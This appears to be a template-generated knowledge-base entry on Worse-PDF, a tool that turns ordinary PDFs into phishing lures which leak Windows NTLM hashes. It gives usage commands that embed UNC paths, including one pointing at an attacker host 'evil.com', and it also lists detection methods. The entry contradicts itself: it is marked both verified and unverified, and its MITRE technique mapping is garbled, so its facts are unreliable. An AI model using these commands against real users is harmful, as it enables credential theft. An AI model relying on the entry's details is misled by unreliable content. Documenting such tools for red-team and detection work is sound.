---
id: 9fbea6f4-c5e3-483f-a59f-9b0319f37e63
type: tool
verified: true
created_at: '2019-08-28T21:17:39.406753+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
tags:
  - pdf-malicious
  - ntlm-stealing
  - phishing
url: 'https://github.com/s0md3v/worsepdf'
validated: true
---

# Worse-PDF

**Status**: Unverified

## Overview

Worse-PDF is a Python-based tool designed to transform benign PDF files into malicious ones by embedding UNC paths or other triggers that prompt Windows users for NTLM authentication when the PDF is opened in viewers like Adobe Reader. This allows attackers to capture Net-NTLM hashes for offline cracking, commonly used in phishing or social engineering campaigns targeting Windows environments.

## Description

The tool modifies PDF structures to include hidden or embedded elements (e.g., UNC links in annotations or actions) that, upon rendering, attempt network access to attacker-controlled shares, eliciting NTLM challenges. It's particularly effective against users with domain credentials, enabling hash theft without direct malware execution. Use cases include red team simulations for credential access testing (MITRE T1556.002 - Network Sniffing for Passwords). Note: Requires pairing with a hash capture tool like Responder.

## Features

- Feature 1: Embed customizable UNC paths in PDF annotations or JavaScript actions
- Feature 2: Preserve original PDF appearance to avoid suspicion
- Feature 3: Support for multiple embed methods (e.g., links, form fields)
- Feature 4: Command-line interface for batch processing

## Installation

### Requirements

- Python 3.6+
- pip-installed dependencies: PyPDF2, reportlab (for PDF manipulation)

### Install Commands

```bash
# Clone the repository (assuming GitHub source)
git clone https://github.com/s0md3v/worsepdf.git
cd worsepdf

# Install dependencies
pip install -r requirements.txt

# For Kali/Ubuntu
sudo apt update && sudo apt install python3-pip
pip3 install PyPDF2 reportlab
```

## Basic Usage

```bash
python worsepdf.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and usage |
| -i, --input | Specify input PDF file |
| -o, --output | Specify output malicious PDF file |
| -u, --unc-path | UNC path for NTLM trigger |

## Examples

### Example 1: Basic Usage

Generate a malicious PDF from an input file:

```bash
python worsepdf.py --input innocent.pdf --output malicious.pdf --unc-path "\\\\192.168.1.100\\share"
```

### Example 2: Advanced Usage

Embed in a specific annotation:

```bash
python worsepdf.py --input report.pdf --output report-evil.pdf --unc-path "\\\\evil.com\\docs" --method annotation
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Password Filter DLL]] - Modify Authentication Process: Network Sniffing
- [[T1566.001]] - Phishing: Spearphishing Attachment

### Tactics

- [[Credential Access]] - Credential Access
- [[Initial Access]] - Initial Access

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for anomalous PDF modifications (e.g., embedded UNC paths via PDF analysis tools like pdfid or qpdf)
- Detection method 2: Network monitoring for unexpected SMB/NTLM authentication attempts to internal or external shares
- Detection method 3: Endpoint detection of PDF viewers spawning network connections (e.g., Adobe Reader to suspicious IPs)
- Detection method 4: Hash capture tools like Responder running on unauthorized systems

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Responder]]
- [[tools/Hashcat]]
- [[PyPDF2]]

## References

- Official GitHub: https://github.com/s0md3v/worsepdf
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1556/002/
- Related resource: Blog on NTLM relay attacks
